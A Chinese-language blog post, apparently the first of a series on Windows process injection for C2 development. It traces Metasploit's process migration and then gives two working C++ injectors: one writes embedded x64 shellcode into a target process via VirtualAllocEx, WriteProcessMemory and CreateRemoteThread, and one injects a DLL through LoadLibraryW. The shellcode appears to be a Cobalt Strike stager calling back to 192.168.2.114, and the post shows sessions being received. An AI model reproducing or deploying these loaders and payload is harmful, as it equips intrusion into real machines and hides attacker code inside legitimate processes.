\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/6f61A\_UPv5EK8j4MJKTHGA)

   准备开一个 ProcessInjection 系列，讲讲 ProcessInjection 的一些手法，毕竟这个技术对于后期的 C2 开发等都是很有意义的。这是第一篇，概述。全文共 3635 字，阅读时间大约十分钟。

测试环境如下

*   windows 10
    
*   vs 2015
    
*   CPP x64
    
*   CobaltStrike 4.1
    

众所周知，msf 具有进程迁移功能，我们就以其进程迁移为例，来展开我们的 ProcessInjection，毕竟进程迁移的本质也就是一次 ProcessInjection。

调试 msf 需要用到 pry-byebug，其官网地址为 (https://github.com/deivid-rodriguez/pry-byebug), 下面是安装方法，首先编写 msf 的 gem 文件，将依赖写入 (/usr/share/metasploit-framework/Gemfile)

```
source 'https://rubygems.org'
# Add default group gems to \`metasploit-framework.gemspec\`:
#   spec.add\_runtime\_dependency '<name>', \[<version requirements>\]
gemspec name: 'metasploit-framework'
 
gem 'sqlite3', '~>1.3.0'
gem 'pry-byebug'
 
# separate from test as simplecov is not run on travis-ci
group :coverage do
  # code coverage for tests
  gem 'simplecov'
end
```

然后修改配置文件 (.bundle/config), 将 BUNDLE\_FROZEN: "true" 改为 BUNDLE\_FROZEN: "false"。然后安装依赖即可

```
bundle install
gem install pry-byebug
```

此时，我们启动 msf，选择相关模块，输入 pry 即可调试

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08U5s2jicY9C9S1ghzlpgEDTZWNIMIGl8WsInqHKBvbOxdQbbRiaAckzyhdh5MoiavhnGibGCATk0JicN5Q/640?wx_fmt=png)

或者在你任何想要调试的模块中加入

```
binding.pry
```

以进程迁移模块（lib/rex/post/meterpreter/client\_core.rb）为例

```
def migrate(target\_pid, writable\_dir = nil, opts = {})
    binding.pry

    keepalive              = client.send\_keepalives
    client.send\_keepalives = false
    target\_process         = nil
    current\_process        = nil

    # Load in the stdapi extension if not allready present so we can determine the target pid architecture...
    client.core.use('stdapi') if not client.ext.aliases.include?('stdapi')

    current\_pid = client.sys.process.getpid

    # Find the current and target process instances
    client.sys.process.processes.each { | p |
      if p\['pid'\] == target\_pid
        target\_process = p
      elsif p\['pid'\] == current\_pid
        current\_process = p
      end
    }
```

这时假如我们调用进程注入功能，则会自动进行 debug

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08U5s2jicY9C9S1ghzlpgEDTZNVwxd5cbu1OydiaEv6tls8TeyQEBNsFVvadtdeSXAicibUPuzP2BbJIpg/640?wx_fmt=png)

然后我们可以看到其会引入客户端的值

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08U5s2jicY9C9S1ghzlpgEDTZDAyERjqJUbWaoD2CDT4uDPQj85HNicZusySgMGbABbn7ZpHB05OCxDg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08U5s2jicY9C9S1ghzlpgEDTZticicWAPU4CoUYlCuPvgRdkH8ljc12ic84nab1jIDWLmicEuvic9iaVwxLUA/640?wx_fmt=png)

最后得到的结论如下

1、获取要迁移到的进程

2、判断目标机器位数，不同位数内存不同

3、判断是否为 SeDebugPrivilege，用于句柄操作

4、计算 payload 长度

5、使用 openprocess 打开进程

6、使用 VirtualAllocEx 分配内存

7、使用 WriteProcessMemory 写入内存

8、使用 CreateRemoteThread 创建线程。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08U5s2jicY9C9S1ghzlpgEDTZSp4soJpYUgzVnYzuiccBZ7RTTVGhBEuTSOvPH7kj8TSt5vc4dUm47eg/640?wx_fmt=png)

于是我们便得到了第一种进程注入的方法，CreateRemoteThread。

使用的 api 为

OpenProcess

```
HANDLE OpenProcess(  DWORD dwDesiredAccess,  // access flag
  BOOL bInheritHandle,    // handle inheritance option
  DWORD dwProcessId       // process identifier
  );
```

  
WriteProcessMemory。

```
BOOL WriteProcessMemory(   
  HANDLE hProcess,               // handle to process
  LPVOID lpBaseAddress,          // base of memory area
  LPVOID lpBuffer,               // data buffer
  DWORD nSize,                   // number of bytes to write
  LPDWORD lpNumberOfBytesWritten // number of bytes written);
  )
```

该函数将你想要写入的数据写入至指定进程中。要注意打开进程的方式，我们不需要使用 PROCESS\_ALL\_ACCESS，只需要下面这样即可

PROCESS\_CREATE\_THREAD|PROCESS\_VM\_WRITE| PROCESS\_VM\_OPERATION，手册已经说的很明白了

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08U5s2jicY9C9S1ghzlpgEDTZF2LRZxMUQt1Lc8pE6NPQhibwhYv5Sec45AnGSqib3rSiaBg2Awg6vMGpA/640?wx_fmt=png)

CreateRemoteThread

```
HANDLE CreateRemoteThread(
  HANDLE hProcess,                          // handle to process
  LPSECURITY\_ATTRIBUTES lpThreadAttributes, // SD
  DWORD dwStackSize,                        // initial stack size
  LPTHREAD\_START\_ROUTINE lpStartAddress,    // thread function
  LPVOID lpParameter,                       // thread argument
  DWORD dwCreationFlags,                    // creation option
  LPDWORD lpThreadId                        // thread identifier
  );
```

demo

```
#include<stdio.h>
#include<windows.h>


int main(int argc, char\* argv\[\]) {

  DWORD ProcessID = DWORD(atoi(argv\[1\]));

  unsigned char buf\[\] = "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x75\\x72\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4f\\xff\\xff\\xff\\x5d\\x6a\\x00\\x49\\xbe\\x77\\x69\\x6e\\x69\\x6e\\x65\\x74\\x00\\x41\\x56\\x49\\x89\\xe6\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x48\\x31\\xc9\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x41\\x50\\x41\\x50\\x41\\xba\\x3a\\x56\\x79\\xa7\\xff\\xd5\\xeb\\x73\\x5a\\x48\\x89\\xc1\\x41\\xb8\\x61\\x1e\\x00\\x00\\x4d\\x31\\xc9\\x41\\x51\\x41\\x51\\x6a\\x03\\x41\\x51\\x41\\xba\\x57\\x89\\x9f\\xc6\\xff\\xd5\\xeb\\x59\\x5b\\x48\\x89\\xc1\\x48\\x31\\xd2\\x49\\x89\\xd8\\x4d\\x31\\xc9\\x52\\x68\\x00\\x02\\x40\\x84\\x52\\x52\\x41\\xba\\xeb\\x55\\x2e\\x3b\\xff\\xd5\\x48\\x89\\xc6\\x48\\x83\\xc3\\x50\\x6a\\x0a\\x5f\\x48\\x89\\xf1\\x48\\x89\\xda\\x49\\xc7\\xc0\\xff\\xff\\xff\\xff\\x4d\\x31\\xc9\\x52\\x52\\x41\\xba\\x2d\\x06\\x18\\x7b\\xff\\xd5\\x85\\xc0\\x0f\\x85\\x9d\\x01\\x00\\x00\\x48\\xff\\xcf\\x0f\\x84\\x8c\\x01\\x00\\x00\\xeb\\xd3\\xe9\\xe4\\x01\\x00\\x00\\xe8\\xa2\\xff\\xff\\xff\\x2f\\x33\\x77\\x7a\\x39\\x00\\x35\\x4f\\x21\\x50\\x25\\x40\\x41\\x50\\x5b\\x34\\x5c\\x50\\x5a\\x58\\x35\\x34\\x28\\x50\\x5e\\x29\\x37\\x43\\x43\\x29\\x37\\x7d\\x24\\x45\\x49\\x43\\x41\\x52\\x2d\\x53\\x54\\x41\\x4e\\x44\\x41\\x52\\x44\\x2d\\x41\\x4e\\x54\\x49\\x56\\x49\\x52\\x55\\x53\\x2d\\x54\\x45\\x53\\x54\\x2d\\x46\\x49\\x4c\\x45\\x21\\x24\\x48\\x2b\\x48\\x2a\\x00\\x35\\x4f\\x21\\x50\\x25\\x00\\x55\\x73\\x65\\x72\\x2d\\x41\\x67\\x65\\x6e\\x74\\x3a\\x20\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x35\\x2e\\x30\\x20\\x28\\x63\\x6f\\x6d\\x70\\x61\\x74\\x69\\x62\\x6c\\x65\\x3b\\x20\\x4d\\x53\\x49\\x45\\x20\\x39\\x2e\\x30\\x3b\\x20\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73\\x20\\x4e\\x54\\x20\\x36\\x2e\\x31\\x3b\\x20\\x54\\x72\\x69\\x64\\x65\\x6e\\x74\\x2f\\x35\\x2e\\x30\\x3b\\x20\\x4c\\x45\\x4e\\x32\\x29\\x0d\\x0a\\x00\\x35\\x4f\\x21\\x50\\x25\\x40\\x41\\x50\\x5b\\x34\\x5c\\x50\\x5a\\x58\\x35\\x34\\x28\\x50\\x5e\\x29\\x37\\x43\\x43\\x29\\x37\\x7d\\x24\\x45\\x49\\x43\\x41\\x52\\x2d\\x53\\x54\\x41\\x4e\\x44\\x41\\x52\\x44\\x2d\\x41\\x4e\\x54\\x49\\x56\\x49\\x52\\x55\\x53\\x2d\\x54\\x45\\x53\\x54\\x2d\\x46\\x49\\x4c\\x45\\x21\\x24\\x48\\x2b\\x48\\x2a\\x00\\x35\\x4f\\x21\\x50\\x25\\x40\\x41\\x50\\x5b\\x34\\x5c\\x50\\x5a\\x58\\x35\\x34\\x28\\x50\\x5e\\x29\\x37\\x43\\x43\\x29\\x37\\x7d\\x24\\x45\\x49\\x43\\x41\\x52\\x2d\\x53\\x54\\x41\\x4e\\x44\\x41\\x52\\x44\\x2d\\x41\\x4e\\x54\\x49\\x56\\x49\\x52\\x55\\x53\\x2d\\x54\\x45\\x53\\x54\\x2d\\x46\\x49\\x4c\\x45\\x21\\x24\\x48\\x2b\\x48\\x2a\\x00\\x35\\x4f\\x21\\x50\\x25\\x40\\x41\\x50\\x5b\\x34\\x5c\\x50\\x5a\\x58\\x35\\x34\\x28\\x50\\x5e\\x29\\x37\\x43\\x43\\x29\\x37\\x7d\\x24\\x45\\x49\\x43\\x41\\x52\\x2d\\x53\\x54\\x41\\x4e\\x44\\x41\\x52\\x44\\x2d\\x41\\x4e\\x54\\x49\\x56\\x49\\x52\\x55\\x53\\x2d\\x54\\x45\\x53\\x54\\x2d\\x46\\x49\\x4c\\x45\\x21\\x24\\x48\\x2b\\x48\\x2a\\x00\\x35\\x4f\\x21\\x50\\x25\\x40\\x41\\x50\\x5b\\x34\\x5c\\x50\\x5a\\x58\\x35\\x00\\x41\\xbe\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x48\\x31\\xc9\\xba\\x00\\x00\\x40\\x00\\x41\\xb8\\x00\\x10\\x00\\x00\\x41\\xb9\\x40\\x00\\x00\\x00\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x93\\x53\\x53\\x48\\x89\\xe7\\x48\\x89\\xf1\\x48\\x89\\xda\\x41\\xb8\\x00\\x20\\x00\\x00\\x49\\x89\\xf9\\x41\\xba\\x12\\x96\\x89\\xe2\\xff\\xd5\\x48\\x83\\xc4\\x20\\x85\\xc0\\x74\\xb6\\x66\\x8b\\x07\\x48\\x01\\xc3\\x85\\xc0\\x75\\xd7\\x58\\x58\\x58\\x48\\x05\\x00\\x00\\x00\\x00\\x50\\xc3\\xe8\\x9f\\xfd\\xff\\xff\\x31\\x39\\x32\\x2e\\x31\\x36\\x38\\x2e\\x32\\x2e\\x31\\x31\\x34\\x00\\x00\\x00\\x00\\x00";


  HANDLE ProHandle = OpenProcess(
    PROCESS\_CREATE\_THREAD| PROCESS\_VM\_WRITE| PROCESS\_VM\_OPERATION,
    FALSE,
    ProcessID
  );

  if (ProHandle == NULL) {
    printf("\[+\]Process Open Fail !!!");
  }

  LPVOID target\_payload = VirtualAllocEx(
    ProHandle,
    NULL,
    sizeof(buf),
    MEM\_COMMIT | MEM\_RESERVE,
    PAGE\_EXECUTE\_READWRITE
  );

  int flag;

  flag = WriteProcessMemory(ProHandle, target\_payload, buf, sizeof(buf), NULL);
  if (flag == 0) {
    printf("\[+\]Process Write Fail !!!");
  }

  CreateRemoteThread(ProHandle,NULL,0,(LPTHREAD\_START\_ROUTINE)target\_payload,NULL,0,NULL);

  CloseHandle(ProHandle);
  return 0;
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08U5s2jicY9C9S1ghzlpgEDTZ4weAN0ia6lvGo1zOxlUGcVCaLQpIjzmSiaxwJXvkliaibWT7Qyv7ODjSow/640?wx_fmt=png)

cs 获取到会话

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08U5s2jicY9C9S1ghzlpgEDTZCiaMVVMbrNdx8nRJf6PVrda2DokGwj1TsSPxwqRcu7NGK8PRroTWZwQ/640?wx_fmt=png)

下面是第二种方法，dll 注入  

1、使用 VirtualAllocEx 分配一个内存

2、使用 WriteProcessMemory 把 dll 路径名字复制到第一步分配的内存中

3、使用 GetProcAddress 得到 LoadLibraryW 或者 LoadLibraryA 在 Kernel32 的实际地址。

首先，整个过程涉及两个进程，DLL 注入的进程 (A) 与想要注入 DLL 的远程进程(B)，想要与远程进程进行交互，进程(A)，就需要调用 OpenProcess，来获取一个指向 B 的句柄。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08U5s2jicY9C9S1ghzlpgEDTZVnGRlByLhVZ1uDofb6ElrCvAngLicorNcNNG7BqWrf29aXVdibSkRnSA/640?wx_fmt=png)

句柄是定义在 windows.h 中的一个可以指向任何东西的指针，有了远程进程 B 的句柄，我们就可以通过

VirtualAllocEx、WriteProcessMemory、CreateRemoteThread 在远程进程 B 中进行相应操作。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08U5s2jicY9C9S1ghzlpgEDTZXlicec9gnIF8n6p55NaJ8KicR8WfQCTQl90NWgfiaibcpTHRGn9muUiccjQ/640?wx_fmt=png)

Kernel32.dll 会被加载到所有的 windows 进程中，其中有一个函数为 LoadLibrary，当其被调用时，它会将一个 dll 映射到该进程中，LoadLibrary 需要知道自己需要加载的 dll，所以需要给它提供一个 dll 路径。LoadLibrary 就会帮你把该 dll 加载到内存中。

我们可以在进程 A 中调用 CreateRemoteThread，将句柄传递给 CreateRemoteThread，从而在进程 B 中调用我们想要调用的任何函数，在该例子中，需要 B 的 LoadLibrary 函数地址。而 LoadLibrary 在所有的进程中的基地址都是一样的，所以我们便可以将 Kernel32.dll 传递给 GetModuleHandle 再使用 GetProcAddress 获取其地址。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08U5s2jicY9C9S1ghzlpgEDTZMuOB5aMOUubZhgsPC8Yw6v1iay1TXrCEPfUMahTObjezibTEZolYTCXg/640?wx_fmt=png)

然后调用 CreateRemoteThread 在远程进程中创建一个线程，让新线程调用正确的 LoadLibrary 函数并在参数中传入第一步分配的内存地址，这个时候，DLL 以及被注入到远程进程的地址空间中，DLL 的 DllMain 函数会受到 DLL\_PROCESS\_ATTACH 通知并且可以执行我们想要执行的代码，当 DllMain 返回的时候，远程线程会从 LoadLibraryW/A 调用返回到 BaseThreadStart 函数，然后该函数调用 ExitThread 终止线程。

而 LoadLibraryA 与 LoadLibraryW 的区别也只是前者为 ANSI 后者为宽字节。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08U5s2jicY9C9S1ghzlpgEDTZkNPdhB4Jk1Yz7Qb89ClLKnS3Xfs29Kicdcw7EcE3bUPglezo3RjyxdQ/640?wx_fmt=png)

demo 如下

```
#include <Windows.h>
#include <stdio.h>

int main(int argc, char \*argv\[\])
{
  HANDLE processHandle;
  PVOID remoteBuffer;
  
  const wchar\_t dllPath\[\] = L"C:\\\\Users\\\\Administrator\\\\Desktop\\\\64.dll";

  printf("Injecting DLL to PID: %i\\n", atoi(argv\[1\]));
  processHandle = OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, DWORD(atoi(argv\[1\])));
  remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM\_COMMIT, PAGE\_READWRITE);
  WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
  PTHREAD\_START\_ROUTINE threatAddress = (PTHREAD\_START\_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
  CreateRemoteThread(processHandle, NULL, 0, threatAddress, remoteBuffer, 0, NULL);
  CloseHandle(processHandle);
  return 0;
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08U5s2jicY9C9S1ghzlpgEDTZmNKTEfYibV5DBWIXt7N9u5WFEciazj1MWxo8OQDaoJxhLGdg6wG9mTgA/640?wx_fmt=png)

收到会话

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08U5s2jicY9C9S1ghzlpgEDTZVdCYGmMghDXNoibATyZibghhIUbHxsSovA7mqZHovxqniaZS3MrDmib1FA/640?wx_fmt=png)

觉得有用的点个在看、转发，持续更新..